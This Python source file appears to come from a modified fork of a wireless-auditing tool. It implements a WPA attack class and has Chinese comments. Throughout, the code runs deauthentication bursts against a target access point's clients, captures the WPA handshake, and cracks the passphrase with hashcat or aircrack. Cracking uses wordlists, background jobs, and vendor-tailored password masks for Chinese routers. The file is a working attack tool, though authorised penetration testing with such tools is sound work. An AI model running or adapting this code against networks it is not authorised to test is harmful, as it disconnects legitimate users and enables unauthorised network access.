#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.i18n import t
from ..util.process import Process
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        '''Initiates full WPA handshake capture attack.'''

        # Skip if user only wants WPS attacks
        if Configuration.wps_only:
            Color.pl('\r{!} {O}%s{W}' % t('wpa.skip_wps_only'))
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # 爆破前再选一次：同 AP 多包 → 有效优先，不同取最新
        from ..util.capture_select import select_handshake_cap, is_valid_handshake_cap
        best_cap = select_handshake_cap(
            Configuration.wpa_handshake_dir, handshake.bssid, handshake.essid)
        if best_cap:
            handshake.capfile = best_cap
        if not is_valid_handshake_cap(
                handshake.capfile, bssid=handshake.bssid, essid=handshake.essid):
            Color.pl('{!} {R}%s{W}' % t('cap.invalid_no_crack'))
            self.success = False
            return False

        # Analyze handshake
        Color.pl('\n{+} %s' % t('wpa.analyze'))
        handshake.analyze()

        # Check wordlist
        if Configuration.wordlist is None:
            Color.pl('{!} {O}%s{W}' % t('wpa.no_wordlist'))
            self.success = False
            return False

        elif not os.path.exists(Configuration.wordlist):
            Color.pl('{!} {O}%s{W}' % t('wpa.wordlist_missing', Configuration.wordlist))
            self.success = False
            return False

        wl_name = os.path.split(Configuration.wordlist)[-1]

        # 1) potfile 瞬时命中
        from ..tools.bg_crack import BgCrack
        key = BgCrack.potfile_check_handshake(handshake)
        if key:
            Color.pl('{+} {G}%s{W}\n' % t('wpa.ok', key))
            self.crack_result = CrackResultWPA(
                handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
            return self.success

        # 2) 默认：独立窗口/后台跑全量字典（不被切片截成 2~3%）
        if BgCrack.enabled():
            Color.pl('\n{+} {C}%s{W}' % t('wpa.crack_bg', wl_name))
            meta = BgCrack.spawn_handshake(handshake)
            if meta is not None:
                # 旁路爆破进行中；主流程继续下一路径/目标
                self.success = False
                return False
            # 启动失败则回落前台

        # 3) 前台爆破（--no-bg-crack 或后台启动失败）
        Color.pl('\n{+} {C}%s{W}' % t('wpa.crack', wl_name))
        key = self._crack_handshake(handshake)
        if key is None:
            Color.pl('{!} {R}%s{W}' % t('wpa.fail'))
            if getattr(Configuration, 'cn_optimize', False):
                key = self._cn_mask_pipeline(handshake)

        if key is None:
            self.success = False
            return False

        Color.pl('{+} {G}%s{W}\n' % t('wpa.ok', key))
        self.crack_result = CrackResultWPA(
            handshake.bssid,
            handshake.essid,
            handshake.capfile,
            key,
        )
        self.crack_result.dump()
        self.success = True
        return self.success

    def _crack_handshake(self, handshake):
        '''握手爆破：hashcat(预算) → aircrack(预算)。'''
        from ..tools.hashcat import HcxPcapTool, Hashcat
        # 预算尽则不爆破
        if Hashcat.budget_exhausted():
            return None

        # 1) hashcat 22000（与 PMKID 同源，支持 --runtime）
        if Process.exists('hashcat') and HcxPcapTool.exists():
            try:
                key = Hashcat.crack_handshake(handshake, show_command=False)
                if key:
                    return key
            except Exception:
                pass

        # 2) aircrack 带墙钟上限
        if Hashcat.budget_exhausted():
            return None
        return Aircrack.crack_handshake(handshake, show_command=False)

    def _cn_mask_pipeline(self, handshake):
        '''国内 WiFi 掩码自动管线：cap→hc22000→hashcat 多掩码爆破，命中即返回。'''
        hc_file = None
        try:
            from ..tools.hashcat import HcxPcapTool, Hashcat
            from ..util.cn_strategy import recommend_masks
            from ..util.router_advisory import identify_vendor
            if not Process.exists('hashcat') or not HcxPcapTool.exists():
                Color.pl('{!} {O}%s{W}' % t('wpa.cn_skip'))
                return None
            if Hashcat.budget_exhausted():
                return None
            hc_file = HcxPcapTool.generate_hc22000_file(handshake.capfile)
        except Exception as e:
            Color.pl('{!} {O}%s{W}' % t('wpa.cn_fail', str(e)))
            return None
        try:
            from ..tools.hashcat import Hashcat
            vendor = identify_vendor(self.target.bssid) or ''
            masks = recommend_masks(self.target.essid, vendor,
                                    limit=getattr(Configuration, 'cn_mask_limit', 4))
            Color.pl('{+} {O}%s{W}' % t('wpa.cn_run', len(masks)))
            for idx, mask in enumerate(masks, 1):
                if Hashcat.budget_exhausted():
                    break
                Color.pl('{+} {C}CN-OPT{W} mask {C}%d/%d{W} {D}%s{W} ...' % (idx, len(masks), mask))
                key = Hashcat.crack_hc22000_mask(hc_file, mask, verbose=False)
                if key:
                    return key
            return None
        finally:
            try:
                if hc_file and os.path.exists(hc_file):
                    os.remove(hc_file)
            except OSError:
                pass


    def capture_handshake(self):
        '''Returns captured or stored handshake, otherwise None.'''
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake', t('wpa.wait_target'))
            def _on_wait(remaining):
                Color.pattack(
                    'WPA', self.target, 'Handshake',
                    '%s {O}%.0fs{W}' % (t('wpa.wait_target'), remaining))
            airodump_target = self.wait_for_target(
                airodump,
                timeout=max(2, int(Configuration.wpa_attack_timeout)),
                on_wait=_on_wait)

            self.clients = []

            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake',
                                  t('wpa.exist_hs', handshake.essid or bssid))
                    Color.pl('\n{+} %s' % t('wpa.use_hs', handshake.capfile))
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            # 周期对齐 auto_attack.py:
            #   爆发 deauth×rounds（默认 4）→ 静默监听 listen 秒（默认 4）→ 再爆发
            # 静默期禁止再踢：给客户端重连完成 4-way EAPOL 的窗口
            listen_secs = float(getattr(Configuration, 'wpa_deauth_listen', None)
                                or getattr(Configuration, 'wpa_deauth_timeout', 4)
                                or 4)
            listen_secs = max(3.0, min(8.0, listen_secs))
            rounds = int(getattr(Configuration, 'scapy_deauth_rounds', 4) or 4)
            cycle = 0

            while handshake is None and not timeout_timer.ended():
                if getattr(Configuration, 'path_deadline', None) is not None:
                    if time.time() >= Configuration.path_deadline:
                        break

                cycle += 1
                # ---------- 1) 爆发阶段：踢站 ----------
                Color.clear_entire_line()
                Color.pattack(
                    'WPA', airodump_target, 'Handshake',
                    t('wpa.deauth_burst', cycle, rounds, len(self.clients)))
                self.deauth(airodump_target)

                # ---------- 2) 静默监听：只收包、不 deauth ----------
                listen_deadline = time.time() + listen_secs
                while time.time() < listen_deadline:
                    if timeout_timer.ended():
                        break
                    if getattr(Configuration, 'path_deadline', None) is not None:
                        if time.time() >= Configuration.path_deadline:
                            break

                    remain = max(0.0, listen_deadline - time.time())
                    Color.clear_entire_line()
                    Color.pattack(
                        'WPA', airodump_target, 'Handshake',
                        t('wpa.deauth_listen',
                          remain, len(self.clients), timeout_timer))

                    # 刷新客户端列表（仍不发送 deauth）
                    try:
                        airodump_target = self.wait_for_target(
                            airodump, refresh=True)
                    except Exception:
                        pass
                    for client in getattr(airodump_target, 'clients', []) or []:
                        sta = (getattr(client, 'station', None) or '').upper()
                        if not AttackWPA._is_usable_client(sta):
                            continue
                        if sta not in self.clients:
                            Color.clear_entire_line()
                            Color.pattack(
                                'WPA', airodump_target, 'Handshake',
                                t('wpa.new_client', '{G}%s{W}' % sta))
                            Color.pl('')
                            self.clients.append(sta)

                    # 检查是否已抓到握手
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        temp_file = Configuration.temp('handshake.cap.bak')
                        try:
                            copy(cap_files[0], temp_file)
                            bssid = airodump_target.bssid
                            essid = (airodump_target.essid
                                     if airodump_target.essid_known else None)
                            hs = Handshake(temp_file, bssid=bssid, essid=essid)
                            if hs.has_handshake():
                                handshake = hs
                                Color.clear_entire_line()
                                Color.pattack(
                                    'WPA', airodump_target, 'Handshake',
                                    '{G}%s{W}' % t('wpa.captured'))
                                Color.pl('')
                                break
                            os.remove(temp_file)
                        except Exception:
                            try:
                                if os.path.exists(temp_file):
                                    os.remove(temp_file)
                            except OSError:
                                pass

                    time.sleep(0.4)

                if handshake is not None:
                    break
                # 静默结束 → 下一轮爆发

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}%s{W}' % t('wpa.capture_fail', Configuration.wpa_attack_timeout))
            return handshake
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)
            return handshake

    def load_handshake(self, bssid, essid):
        '''多份握手时：只认有效；相同取其一；不同取最新。'''
        from ..util.capture_select import select_handshake_cap, list_handshake_caps

        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        all_caps = list_handshake_caps(Configuration.wpa_handshake_dir, bssid, essid)
        best = select_handshake_cap(Configuration.wpa_handshake_dir, bssid, essid)
        if best is None:
            if all_caps:
                Color.pl('{!} {O}%s{W}' % t('cap.none_valid', len(all_caps)))
            return None
        if len(all_caps) > 1:
            Color.pl('{+} {D}%s{W}' % t(
                'cap.pick', len(all_caps), os.path.basename(best)))
        return Handshake(capfile=best, bssid=bssid, essid=essid)

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
            相同内容不重复存；无效握手不存。
        '''
        from ..util.capture_select import (
            is_valid_handshake_cap, list_handshake_caps,
            file_fingerprint, select_handshake_cap,
        )

        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # 只存有效握手
        if not is_valid_handshake_cap(
                handshake.capfile, bssid=handshake.bssid, essid=handshake.essid):
            Color.pl('{!} {O}%s{W}' % t('cap.invalid_skip_save'))
            return

        existing = list_handshake_caps(
            Configuration.wpa_handshake_dir, handshake.bssid, handshake.essid)
        new_fp = file_fingerprint(handshake.capfile)
        for p in existing:
            if file_fingerprint(p) == new_fp:
                # 内容相同 → 复用已有，不另存
                handshake.capfile = p
                Color.pl('{+} {D}%s{W}' % t('cap.same_reuse', os.path.basename(p)))
                return

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
            Color.pl('{G}saved{W}')
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            Color.pl('{G}saved{W}')

        handshake.capfile = cap_filename
        # 若同 BSSID 另有旧有效包，提示将按最新有效爆破
        best = select_handshake_cap(
            Configuration.wpa_handshake_dir, handshake.bssid, handshake.essid)
        if best and os.path.abspath(best) == os.path.abspath(cap_filename) and len(existing) >= 1:
            Color.pl('{+} {D}%s{W}' % t('cap.newest', os.path.basename(best)))


    @staticmethod
    def _is_usable_client(station):
        '''过滤广播/组播/空地址，避免把 FF:FF:FF:FF:FF:FF 当客户端。'''
        if not station:
            return False
        sta = station.strip().upper().replace('-', ':')
        if len(sta) != 17:
            return False
        if sta in ('FF:FF:FF:FF:FF:FF', '00:00:00:00:00:00'):
            return False
        # 组播 MAC：首字节最低位为 1
        try:
            first = int(sta.split(':')[0], 16)
            if first & 0x01:
                return False
        except ValueError:
            return False
        return True

    def deauth(self, target):
        '''一次「爆发」：优先踢已知 STA，再广播。

        每个目标内部: Scapy burst × rounds（默认 4，约 256 帧）。
        本方法只负责发送，调用方负责之后的静默监听窗口。
        单次爆发最多打 3 个 STA + 广播，避免踢太久占满捕获时间。
        '''
        if Configuration.no_deauth:
            return

        from ..tools.deauth import send_deauth

        # 已知客户端优先（注入更准），最多 3 个，最后广播
        sta_list = [c for c in self.clients if AttackWPA._is_usable_client(c)][:3]
        targets = sta_list + [None]
        for client in targets:
            if client is None:
                target_name = '*broadcast*'
            else:
                target_name = client
            Color.clear_entire_line()
            Color.pattack(
                'WPA', target, 'Handshake',
                t('wpa.deauth_to', target_name))
            send_deauth(
                target.bssid,
                client_mac=client,
                essid=target.essid if getattr(target, 'essid_known', False) else None,
                timeout=2,
            )

if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
        pass
    Configuration.exit_gracefully(0)
